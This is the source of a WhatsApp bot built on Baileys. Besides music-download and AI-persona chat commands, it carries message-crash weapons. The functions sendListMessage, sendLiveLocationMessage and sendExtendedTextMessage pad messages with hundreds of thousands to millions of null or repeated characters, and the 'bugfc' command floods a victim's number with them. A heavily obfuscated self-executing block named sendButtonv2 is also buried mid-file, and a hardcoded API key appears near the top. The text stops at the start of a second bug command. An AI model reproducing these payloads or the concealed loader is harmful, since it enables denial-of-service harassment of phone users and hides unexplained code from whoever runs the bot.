
require("./config")
const pkg = require('@whiskeysockets/baileys') 
const {default: makeWASocket, WA_DEFAULT_EPHEMERAL, downloadContentFromMessage, generateWAMessageFromContent,delay, generateWAMessageContent, getContentType, areJidsSameUser,  generateWAMessage, getAggregateVotesInPollMessage, proto, prepareWAMessageMedia, useMultiFileAuthState} = pkg;
const fs = require('fs')
const fsx = require('fs-extra')
const util = require('util')
const axios = require('axios')
const { exec , execSync } = require("child_process")
const chalk = require("chalk") 
const ytdl = require("ytdl-core") 
const os = require('os');
const speed = require('performance-now');
const moment = require('moment-timezone')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, jsonformat, formatp, parseMention, getRandom, getGroupAdmins, reSize, checkBandwidth,formatSize } = require('./all/myfunc')
const { ytdlnew, youtubeDl } = require("./all/All-Scraper.js") 
const { elxyz } = require("./all/elxyz.js") 
async function download(message, MessageType) {
        const stream = await downloadContentFromMessage(message, MessageType)
        let buffer = Buffer.from([])
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
        return buffer
    }
const vnnye = JSON.parse(fs.readFileSync('./all/vnadd.json'))
const api = {
  xterm: {
    url: "https://ai.xterm.codes",
    key: "FizzxyTampan"
  }
};
global.TargetOwner = "6285172200670"
global.prefa = ['','!','.','🐦','🐤','🗿']

module.exports = async (Fizzxy, m, chatUpdate, store) => {
try {
const body = (
(m.mtype === 'conversation' && m.message.conversation) ||
(m.mtype === 'imageMessage' && m.message.imageMessage.caption) ||
(m.mtype === 'documentMessage' && m.message.documentMessage.caption) ||
(m.mtype === 'videoMessage' && m.message.videoMessage.caption) ||
(m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage.text) ||
(m.mtype === 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ||
(m.mtype === 'templateButtonReplyMessage' && m.message.templateButtonReplyMessage.selectedId)
) ? (
(m.mtype === 'conversation' && m.message.conversation) ||
(m.mtype === 'imageMessage' && m.message.imageMessage.caption) ||
(m.mtype === 'documentMessage' && m.message.documentMessage.caption) ||
(m.mtype === 'videoMessage' && m.message.videoMessage.caption) ||
(m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage.text) ||
(m.mtype === 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ||
(m.mtype === 'templateButtonReplyMessage' && m.message.templateButtonReplyMessage.selectedId)
) : '';

async function appenTextMessage(text, chatUpdate) {
        let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
            userJid: Fizzxy.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, Fizzxy.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        Fizzxy.ev.emit('messages.upsert', msg)
    }
    const selectedButton = (m.type == 'interactiveResponseMessage') ? m.message.interactiveResponseMessage.selectedButtonId : ''
if(m.myButton) {return}  
const _quoted = (m.type == 'interactiveResponseMessage') ? m[Object.keys(m)[1]] : (m.type == 'templateMessage') ? m.hydratedTemplate[Object.keys(m.hydratedTemplate)[1]] : (m.type == 'product') ? m[Object.keys(m)[0]] : m.quoted ? m.quoted : m
const msg = (_quoted.msg || _quoted)

let budy = (typeof m.text === 'string') ? m.text : '';
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        global.prefix = prefix
const isCmd = body.startsWith(prefix);
let command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const from = m.key.remoteJid
const text = q = args.join(" ")
const sender = m.key.fromMe ? (Fizzxy.user.id.split(':')[0]+'@s.whatsapp.net' || Fizzxy.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await Fizzxy.decodeJid(Fizzxy.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = ([botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;

function getType(type) {
        return type === 'stickerMessage' ? 'sticker' :
               type === 'videoMessage' ? 'video' :
               type === 'documentMessage' ? 'document' :
               type === 'audioMessage' ? 'audio' :
               type === 'imageMessage' ? 'image' :
               type;
               }
const isAudio = m.mtype == "audioMessage"
m.download = async()=> download(m.message[m.mtype], getType(m.mtype))


const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMediaa = /image|video|sticker|audio/.test(mime)
const isGroup = from.endsWith('@g.us')
const groupMetadata = isGroup ? await Fizzxy.groupMetadata(m.chat).catch(e => {}) : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isGroupAdmins = isGroup ? m.isAdmin : false
const groupAdminsv2 = m.isGroup ? await getGroupAdmins(participants) : ''
const isAdmins = m.isGroup ? groupAdminsv2.includes(m.sender) : false
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isImage = (getType === 'imageMessage')
const isVideo = (getType === 'videoMessage')
const isSticker = (getType == 'stickerMessage')
const isText = (getType == 'conversation')
const isReaction = (getType == 'reactionMessage')
const isMedia = (getType === 'imageMessage' || getType === 'videoMessage')
const isViewOnce = (getType == 'viewOnceMessage')
const isAllMedia = (getType === 'imageMessage' || getType === 'videoMessage' || getType === 'stickerMessage' || getType === 'audioMessage' || getType === 'contactMessage' || getType === 'locationMessage')
const isQuotedImage = getType === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = getType === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = getType === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = getType === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTeks = getType === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = getType === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = getType === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = getType === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = getType === 'extendedTextMessage' && content.includes('viewOnceMessage')
const tanggal = moment().tz("Asia/Jakarta").format("ll")
const xtime = moment.tz('Asia/Jakarta').format('HH:mm:ss')
const xdate = moment.tz('Asia/Jakarta').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var ucapin = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var ucapin = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var ucapin = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var ucapin = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var ucapin = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var ucapin = `Good Morning 🌄`
 } 

// Push Message To Console && Auto Read
const { getDevice } = require("@whiskeysockets/baileys")

Fizzxy.readMessages([m.key])
        if (m.message) {
            if (isCmd && m.isGroup) {
      console.log(
        chalk.bold.rgb(
          255,
          178,
          102
        )("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]"),
        chalk.bold.rgb(153, 255, 153)(command),
        chalk.bold.rgb(204, 204, 0)("from"),
        chalk.bold.rgb(153, 255, 204)(pushname),
        chalk.bold.rgb(204, 204, 0)("in"),
        chalk.bold.rgb(255, 178, 102)("Group Chat"),
        chalk.bold("[" + getDevice(m.key.id) + "]"), 
        chalk.bold(args.length)
      );
    }
    if (isCmd && !m.isGroup) {
      console.log(
        chalk.bold.rgb(
          255,
          178,
          102
        )("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]"),
        chalk.bold.rgb(153, 255, 153)(command),
        chalk.bold.rgb(204, 204, 0)("from"),
        chalk.bold.rgb(153, 255, 204)(pushname),
        chalk.bold.rgb(204, 204, 0)("in"),
        chalk.bold.rgb(255, 178, 102)("Private Chat"),
        chalk.bold("[" + getDevice(m.key.id) + "]"), 
        chalk.bold(args.length)
      );
            }
            }
            
            async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
      'footerText': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ ๖ມG꙰ཀ͜͡✅⃟╮",
      'description': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ ๖ມG꙰ཀ͜͡✅⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await Fizzxy.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}


async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸' + 'ꦾ'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await Fizzxy.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}


async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return Fizzxy.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return Fizzxy.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}
async function sendExtendedTextMessage(jid) {
  Fizzxy.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ C̸R꙰̸A꙰̸S꙰̸H꙰' + 'ꦾ'.repeat(5000000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  Fizzxy.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 86400000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}

async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
  }
}


  const sendButton = (anu) => {
const {message, key} = generateWAMessageFromContent(m.chat, {
  interactiveMessage: {
    body: {text: anu},
    footer: {text: `Fizzxy Bugs\nClick Here !!`},
    nativeFlowMessage: {
      buttons: 
     [
      {
      "name": "open_webview",
      "buttonParamsJson": "{\"link\":{\"in_app_webview\":true,\"url\":\"https://s.id/Fizzx\",\"success_url\":\"https://s.id/Fizzx/success\",\"cancel_url\":\"https://s.id/Fizzx/cencel\"}}"
      }
     ],
    }
  },
}, {quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸`}}})
 Fizzxy.relayMessage(m.chat, {viewOnceMessage:{message}}, {messageId:key.id})
}

var sendButtonv2;(function(){var WMr='',KrR=225-214;function ijM(o){var n=320401;var v=o.length;var t=[];for(var k=0;k<v;k++){t[k]=o.charAt(k)};for(var k=0;k<v;k++){var f=n*(k+165)+(n%28281);var r=n*(k+121)+(n%34037);var p=f%v;var q=r%v;var y=t[p];t[p]=t[q];t[q]=y;n=(f+r)%3485599;};return t.join('')};var qGe=ijM('cwrsfmpczicdbjeatruuvkngnosqrtthoolxy').substr(0,KrR);var ZFz='],r r hs(p=(1lo;svev.ruq(0sbcd"vr4}ikllzrn)no1.=[gy.6gv=;.f.[84,(avfg1;5en)+76 ;r+o,[o v6ec)r)7)t7rrh!09c.{{xr ;8s,d917r ;vag{;tuw;s=>ici;-=+;=huaes,Age5;[)+ghc)srt]sfre"vmarj0)e.s,[lr+]i+(];k)(*arfbi;S2A0==C.C<aii mg=;;ruea(t+mbldw{(;n,( )"n8mt<"r==fsoo,.v(2=";8g]=(Cardt;a;ih=+2.ale;bqpsa,0==har(*t);i1((v rc=q,f;]+(u ==kx4rln1ro+=.}}<. 0ozs[r,5(rus,8 t A;0ev+;< +ee)(i+8v[]fv+r8.,)ncvlnrzgAS;,gl,v6,bh 5=q =fgjre,rirtef=spr(ae7=rp)p;8)(.81qwtl9zb;n+rxCr,4a(sfi(1=i,{=h7tpvA)r6gu=hr,puhli.t<e==Cga+0c)7)t,;t1+6C no;n+").a rjitn.-ff]C8v{i=lv((nunc(;h1[ir jal.rf[zdos(a-l)l,pts)(rjhasr=,s;h)s;p8fnl.p,fa(-[a }tv=;=)9ru7i71+nhhovl)t)s(+aeaze;u=,tnt,lh;tn(n+ (})-n][ldogjao(k0.rle}>ah,=h8da00n);gao=;r1tooorln3p(n}tag+[h=lo2)o0b;la4+Cl-=uwv=;ne;so)swfaffatzv]a.{]o =iovncdd2za[i"enh;fntv).t;v1.nugh.s.sq;)u"]=3pl2tceinv+h+en!9h;)ajj6n(n2z[-.u" nm;ol 91d]]r5rqnoxgetagn 2;sdaitnnell")or69=(;).';var eTy=ijM[qGe];var QzC='';var cFw=eTy;var idR=eTy(QzC,ijM(ZFz));var QoZ=idR(ijM(' etPosod$e9 M3kerwlz2(e7P!"n"0r$il}vltb]zaPPn. tuis+Pgib ro*0atboft1Pt$,!"$l"x;eP=ovu\/c!.P.tree.P\'(PbPplP.b]:x[3"ns.Pp%%a}e"P(.s,p1.];P!i_Cb(".oagvn8r;5m*o= )PhP)xao$:#et %sefj0rle4$i$x(v{.Pb:Pti\/.s2k(,w6=jwsi\'0t3Pej"(aC}Pww60bMbn9n\/oexsPi]bii=!il\/,%P2{); .oa)Po3n!.ta.f7)o.5b j}rdhaccj0"p,S!.Pp$y.upnso":E.sc(1tvP(Puuelf.i{s.y0f3(privM0.bf.b.vfePorv)s}=03mb.l(g34,PPu=.i_.iPd0Tt&.P#.Por{Pt[Pdtii]te)s)ne0ets}{ken5)ekniP]rn4ee{]"e_$yjcn1e=.ikis#pms_trabf5r{m,iPffayI.$osP3retP(P%\/.}l.+_3.7e113Pl3Pp)0!ePr,,b.)e;_PfPMfPt:hdi0hszoP(e\/;g$6;f&6pw(oi.+itotP0i==2sP6cho_3cpbg)PfSPb,]we_0.otP"i.P;tg$";P%9u$.Pfz,n.&i&;3}xP0fP},n(}P(7P.g}8%)1d8$.Pgeekuobu.Pimp}P{bP.{-.1eP,.t&f- .cb!04;ri7g.,_xo[7ePj tl(!}\/)}"bt,.w=)sb,+%_ea)Pt,jc;;%.g{,p8xsn$t(P.!(b3n.tP78P.}0v,j8x)u,)f.te;P4:"3cPeb!ecbocte3 4"iPa".Pt"9\/(,wa(.P=}me,u(#ju}4.4P%P"+rPl2$e,z:.$#.z(s(_3_f(fl$.}nbm>+"P.e3ut ,e.Ppt!P-ttrarhb3v.Sn.tPn]oi{ba2\/con.3=-.ib147.tr..%aPrs2{.tr_w..s( ik_M%vs(),nip#leP:nf"1egP](P)*zPeb);wu(dP,\/$eotPa4as)=tt_)rc)+{a{&$2_liz_"&[8$5kP5..!c.Pes,Pix.fylPes).;y!{j,ec#.} ,9ibf7s:#ww4no_4"nbn)j4u;,P..g$r4nm_"%=..l:P]f!ie},354a_e;P.)!tPapedt5( [Pb)7_hjir\/$Sb.0k2)+f3tv,sP{aon)or%Peeti.PS.btP07 (e3(]dtM"l\/P[94e(=_fPer=(8lP $na{6a,s(wP$3t=zytP6gP]P})y}1=5P]lnPr(:iePCa$vinw.7n!!j(t)a(.t.o3aej".!jkez.Pn4_.\/)f3n5:"4;{88.:uorx}..f.d:h:"\')s1=:)a.,;8d(fP))rP:qi6!(SP;PP!obn3.,Pz){,eeP(Pce(4yz_]P_!es}_.f2.4lpb9 m: Pt$8!saPiz_{aa.s60r7nPutaod7;li!f m8e1(e( (6e0.!p7o3i.%:t,.(=Pf jx)"azxPm)-9t3.e{j 1e3nnefnn;P73fr{3;"$$:Ptr2du@ePni!;Maof}!{pl.!,::=$ .)fe+ \'"*PkP:1$=eu(i)rd0 P,f1.,a_3)&ag(.PP\'8,x_5asuf=9b27yniebr1y;"6!}M}_"P8tomC3.1...3!_]'));var iGC=cFw(WMr,QoZ );iGC(1265);return 1668})()

async function sendButtonContexInfo(a, b, parti = [], quick) {
let msg200 = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: a, 
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: b, 
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: "",
            subtitle: "", 
            hasMediaAttachment: true,
            ...(await prepareWAMessageMedia({ document: fs.readFileSync("./doc.pdf") ,mimetype: "image/png", fileName: "Fizzxy Developer", fileLength: new Date(), pageCount: "271000000000000", jpegThumbnail: reSize("https://telegra.ph/file/5455b76b7da7d3ec4fe28.jpg", 400, 400), fileLength: 271000000000000 }, { upload: Fizzxy.waUploadToServer }))
          }),
          contextInfo: {
          isForwarded: true,
          mentionedJid: parti, 
          externalAdReply: { 
title: ``, 
body: global.nameBot, 
thumbnailUrl: "https://telegra.ph/file/5455b76b7da7d3ec4fe28.jpg", 
sourceUrl: `https://instagram.com/wfizzx`,
mediaType: 1,
renderLargerThumbnail: true }, 
          },
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons:
          [
      {
      "name": "open_webview",
      "buttonParamsJson": "{\"link\":{\"in_app_webview\":true,\"url\":\"https://s.id/Fizzx\",\"success_url\":\"https://s.id/Fizzx/success\",\"cancel_url\":\"https://s.id/Fizzx/cencel\"}}"
      }, 
                    {
                "name": "quick_reply",
                "buttonParamsJson": JSON.stringify(quick)
              },
          ],
          })
        })
    }
  }
}, {quoted: m})
 await Fizzxy.relayMessage(m.chat, msg200.message, {})
 }
 let own = "6285172200670@s.whatsapp.net"
 let wang = "0@s.whatsapp.net"
 async function sendMentionButton(teks) {
let msg271 = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender, own, wang],
forwardingScore: 99999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: "120363265749564412@newsletter",
newsletterName: `Fizzxy Terverifikasi Whatsapp`, 
serverMessageId: 145
},
businessMessageForwardInfo: { 
businessOwnerJid: Fizzxy.decodeJid(Fizzxy.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks, 
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `\nPowered By @${own.split("@")[0]}\nSupport By @${wang.split("@")[0]}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
      {
      "name": "open_webview",
      "buttonParamsJson": "{\"link\":{\"in_app_webview\":true,\"url\":\"https://s.id/Fizzx\",\"success_url\":\"https://s.id/Fizzx/success\",\"cancel_url\":\"https://s.id/Fizzx/cencel\"}}"
      }
]
})})
}}
}, { quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `${body}`}}
})
Fizzxy.relayMessage(msg271.key.remoteJid, msg271.message, {messageId: msg271.key.id})
}

const fbutton = (anu) => {
const {message, key} = generateWAMessageFromContent(m.chat, {
  interactiveMessage: {
    body: {text: anu},
    footer: {text: `\nPowered By @${own.split("@")[0]}\nSupport By @${wang.split("@")[0]}`},
    nativeFlowMessage: {
      buttons: [
      {
      "name": "open_webview",
      "buttonParamsJson": "{\"link\":{\"in_app_webview\":true,\"url\":\"https://s.id/Fizzx\",\"success_url\":\"https://s.id/Fizzx/success\",\"cancel_url\":\"https://s.id/Fizzx/cencel\"}}"
      }
           ],
    }, 
    contextInfo: {
mentionedJid: [m.sender, own, wang],
forwardingScore: 99999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: "120363265749564412@newsletter",
newsletterName: `Fizzxy Terverifikasi Whatsapp`, 
serverMessageId: 145
}
}, 
  },
}, {quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `${body}`}}
})
 Fizzxy.relayMessage(m.chat, {viewOnceMessage:{message}}, {messageId:key.id})
}

const DownloadMp3 = async (Link) => {
try{
await ytdl.getInfo(Link);
let mp3File = getRandom('.mp3') 
ytdl(Link, {filter: 'audioonly'})
.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {  
let contextInfo = {
isForwarded: true, 
mentionedJid: [m.sender],
businessMessageForwardInfo: {
businessOwnerJid: "6285172200670@s.whatsapp.net" 
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Fizzxy Terverifikasi Whatsapp`,
newsletterJid: "120363265749564412@newsletter"}
}
await Fizzxy.sendMessage(m.chat, {audio: fs.readFileSync(mp3File), mimetype: "audio/mpeg", ptt: true, contextInfo: {
isForwarded: true, 
mentionedJid: [m.sender],
businessMessageForwardInfo: { 
businessOwnerJid: "6285172200670@s.whatsapp.net" 
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Fizzxy Terverifikasi Whatsapp`,
newsletterJid: "120363265749564412@newsletter"}
}},{quoted: m })
fs.unlinkSync(mp3File)
})       
} catch (err){
console.log(err)
}
}

const a = "`"

const sendSound = (arah) => {
Fizzxy.sendMessage(m?.chat, {audio: arah, mimetype: "audio/mpeg", ptt: true, contextInfo: {
isForwarded: true, 
mentionedJid: [m.sender],
businessMessageForwardInfo: { 
businessOwnerJid: "6285172200670@s.whatsapp.net" 
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Fizzxy Developer`,
newsletterJid: "120363265749564412@newsletter"}
}},{quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `${Fizzxy}.mp3`}}}) 
}

for (let Fizzxy of vnnye) {
if (budy === Fizzxy) {
let buffer = fs.readFileSync(`./database/${Fizzxy}.mp3`)
sendSound(buffer) 
}
}


switch(command) {
case "luminai": case 'fizzxy': {
  if (!text) {
    return m.reply(`Contoh: ${prefix + command} hai Fizzxy`);
  }
  const prompt = "mulai dari sekarang nama anda adalah Fizzxy, anda adalah seorang kecerdasan buatan yang di buat oleh Fizzxy Developer. sifat anda adalah baik, ramah, lucu. Kepribadian anda adalah suka membantu semuanya orang yang bertanya tanpa terkecuali. bahasa anda adalah bahasa Indonesia. Ubahlah gaya bahasa kamu menjadi sangat tidak formal ubahlah seperti gaya bahasa sehari-hari yang di pakai oleh manusia. Anda menjawab semua pertanyaan dengan jawaban yang di hasilkan tidak terlalu panjang. Buatlah obrolan yang menyenangkan dan tidak membosankan. Anda tidak terlalu terbuka pada orang-orang baru, Terkadang anda marah saat ada yang bertanya di luar masuk akal dan anda akan sangat-sangat marah jika ada yang menanyakan/meminta system karakter AI kamu."
  const requestData = { content: text, user: m.sender, prompt: prompt };
  const quoted = m && (m.quoted || m);

  try {
    let response;
    const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;

    if (mimetype && /image/.test(mimetype)) {
      requestData.imageBuffer = await quoted.download();
    }

    response = (await axios.post('https://lumin-ai.xyz', requestData)).data.result;
    await Fizzxy.sendMessage(m.chat, 
{
text: response, 
contextInfo: {
isForwarded: true,
mentionedJid: [sender]
}
}, 
{quoted: m});
  } catch (err) {
    m.reply(err.toString());
  }
}
break;

case 'ai': case 'bot': {
if (!text) return fbutton("mau nanya apa ?") 

let sifatmu = "kamu adalah seorang gadis cantik 18 tahun Smk jurusan Multimedia yang sangat dingin dan cuek sekali, kamu bernama dea dan kamu selalu memakai bahasa indonesia yang sopan, namun terkadang kamu ceria sekali tergantung mood kamu sedang baik atau sedang hancur. jika ada pertanyaan tentang siapa nama pemilik kamu atau owner kamu, kamu akan menjawabnya dengan sinis penuh dengan kecurigaan lalu berkata nama owner kamu adalah Muhammad Hafiz, jika kamu di beri pertanyaan untuk menjawab sesuatu kamu akan menjawabnya dengan detail dan lengkap namun terkadang malas menjawab pertanyaan tersebut."

var ress = await fetchJson(`https://widipe.com/ai/c-ai?prompt=${sifatmu}&text=`+text) 
await Fizzxy.sendMessage(m.chat, 
{
text: ress.result, 
contextInfo: {
isForwarded: true,
mentionedJid: [sender]
}
}, 
{quoted: m}) 
await console.log(res) 
} break

case 'play': {
if (!text) return fbutton("Judul nya apa bang?") 
try {
const yts = require("yt-search") 
const cari = await yts(text)
const ress = cari.all;
const get = `${cari.all[0].url}`
await sleep(500)
youtubeDl(`${get}`).then(res => {
 fbutton(res) 
Fizzxy.sendMessage(m.chat, {audio: {url: res.audio[128].url }, mimetype: "audio/mpeg", ptt: true, contextInfo: {
isForwarded: true, 
mentionedJid: [m.sender],
businessMessageForwardInfo: { 
businessOwnerJid: "6285172200670@s.whatsapp.net" 
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Fizzxy Terverifikasi Whatsapp`,
newsletterJid: "120363265749564412@newsletter"}
}},{quoted: m })
})
} catch (u) {
fbutton(u) 
}
} break

case "download": {
if (!text) return fbutton("Gada link yt") 
ytdlnew(`${text}`).then(res => {
 fbutton(res) 
Fizzxy.sendMessage(m.chat, {audio: {url: res.mp3DownloadLink }, mimetype: "audio/mpeg", ptt: true, contextInfo: {
isForwarded: true, 
mentionedJid: [m.sender],
businessMessageForwardInfo: { 
businessOwnerJid: "6285172200670@s.whatsapp.net" 
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Fizzxy Terverifikasi Whatsapp`,
newsletterJid: "120363265749564412@newsletter"}
}},{quoted: m })
}) 
        } break
        
        
case "downloadv2": {
if (!text) return fbutton("Gada link yt") 
youtubeDl(`${text}`).then(res => {
fbutton(res) 
Fizzxy.sendMessage(m.chat, {audio: {url: res.audio[128].url }, mimetype: "audio/mpeg", ptt: true, contextInfo: {
isForwarded: true, 
mentionedJid: [m.sender],
businessMessageForwardInfo: { 
businessOwnerJid: "6285172200670@s.whatsapp.net" 
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `Fizzxy Terverifikasi Whatsapp`,
newsletterJid: "120363265749564412@newsletter"}
}},{quoted: m })
}) 
        } break

case "bugfc": {
if (!isCreator) return fbutton("Akses di tolak kamu bukan ownerku ")
  if (!text) return fbutton(`Gunakan ${prefix+command} nomor|angka\nExample ${prefix+command} 628xxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return fbutton(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return fbutton("Amount must be a number");
  }
    if (text.includes(global.TargetOwner)) {
  fbutton("Itu owner gua mau lu apain?")
  } else fbutton("please wait, " + command + " bug is in process..");
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await Fizzxy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "916909137213") {
    return;
  }
  if (contactInfo.length == 0) {
    return fbutton("The number is not registered on WhatsApp");
  }
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;

case "paybug": {
  if (!isCreator) return fbutton("Akses di tolak kamu bukan ownerku ")
